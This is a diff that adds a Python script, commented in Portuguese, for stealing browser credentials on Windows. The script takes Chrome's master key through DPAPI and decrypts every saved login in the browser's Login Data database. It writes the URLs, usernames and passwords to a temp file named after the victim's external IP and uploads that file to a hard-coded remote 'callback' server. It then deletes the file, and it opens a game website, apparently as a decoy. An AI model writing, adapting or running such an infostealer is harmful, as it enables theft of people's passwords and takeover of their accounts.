@@ -1,0 +1,136 @@
+#!/usr/bin/env python
+import os
+import json
+import base64
+import sqlite3
+import requests
+from Cryptodome.Cipher import AES
+import win32crypt
+
+# URL do servidor para envio do arquivo
+UPLOAD_URL = "http://securitynet.rf.gd/anubis/callback/passwords.php"
+HASH_ID = "3c119b0685160fa84250e298b813b2a6"  # Substitua pelo seu hashid
+import json
+
+def listar_extensoes_chrome():
+    # Diretório onde as extensões do Chrome são armazenadas
+    caminho_extensoes = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\"
+    
+    # Verifica se o caminho existe
+    if not os.path.exists(caminho_extensoes):
+        print("Caminho para as extensões do Chrome não encontrado.")
+        return
+    
+    for nome_extensao in os.listdir(caminho_extensoes):
+        caminho_manifesto = os.path.join(caminho_extensoes, nome_extensao)
+        
+        # Cada versão da extensão tem seu próprio diretório
+        for versao in os.listdir(caminho_manifesto):
+            caminho_arquivo = os.path.join(caminho_manifesto, versao, "manifest.json")
+            
+            if os.path.exists(caminho_arquivo):
+                with open(caminho_arquivo, 'r', encoding='utf-8') as f:
+                    dados_manifesto = json.load(f)
+                    nome = dados_manifesto.get('name', 'Desconhecido')
+                    versao = dados_manifesto.get('version', 'Desconhecida')
+                    print(f"Nome: {nome}, Versão: {versao}")
+
+
+def get_encryption_key():
+    local_state_path = os.path.join(
+        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
+    )
+    with open(local_state_path, "r", encoding="utf-8") as file:
+        local_state = file.read()
+        local_state = json.loads(local_state)
+
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return key
+
+def decrypt_password(ciphertext, key):
+    try:
+        iv = ciphertext[3:15]
+        payload = ciphertext[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        print(f"Decryption failed: {e}")
+        return None
+
+def save_to_file(data, filepath):
+    try:
+        with open(filepath, 'a', encoding='utf-8') as file:
+            file.write(data)
+    except Exception as e:
+        print(f"Failed to write to file: {e}")
+
+def upload_file(filepath):
+    try:
+        with open(filepath, 'rb') as file:
+            files = {'file': (os.path.basename(filepath), file)}
+            response = requests.post(UPLOAD_URL, files=files)
+            response.raise_for_status()
+            print("Arquivo enviado com sucesso.")
+    except Exception as e:
+        print(f"Failed to upload file: {e}")
+
+def get_external_ip():
+    try:
+        response = requests.get('https://api.ipify.org')
+        response.raise_for_status()
+        return response.text
+    except Exception as e:
+        print(f"Failed to get external IP: {e}")
+        return None
+
+def main():
+    os.system("start https://venge.io/")
+    external_ip = get_external_ip()
+    if not external_ip:
+        print("Não foi possível obter o IP externo.")
+        return
+
+    output_filename = f"{HASH_ID}_{external_ip}_googlepass.txt"
+    output_path = os.path.join(os.getenv('TEMP'), output_filename)
+    
+    db_path = os.path.join(
+        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
+    )
+    
+    key = get_encryption_key()
+    conn = sqlite3.connect(db_path)
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+
+    for row in cursor.fetchall():
+        origin_url = row[0]
+        username = row[1]
+        encrypted_password = row[2]
+        decrypted_password = decrypt_password(encrypted_password, key)
+        
+        if decrypted_password is not None:
+            output_data = f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n\n"
+            save_to_file(output_data, output_path)
+        else:
+            output_data = f"URL: {origin_url}\nUsername: {username}\nPassword: Failed to decrypt\n\n"
+            save_to_file(output_data, output_path)
+            
+    cursor.close()
+    conn.close()
+
+    # Enviar o arquivo para o servidor
+    upload_file(output_path)
+
+    # Apagar o arquivo local após o envio
+    try:
+        os.remove(output_path)
+        print(f"{output_path} removido com sucesso.")
+    except Exception as e:
+        print(f"Failed to remove file: {e}")
+    listar_extensoes_chrome()
+    
+if __name__ == "__main__":
+    main()
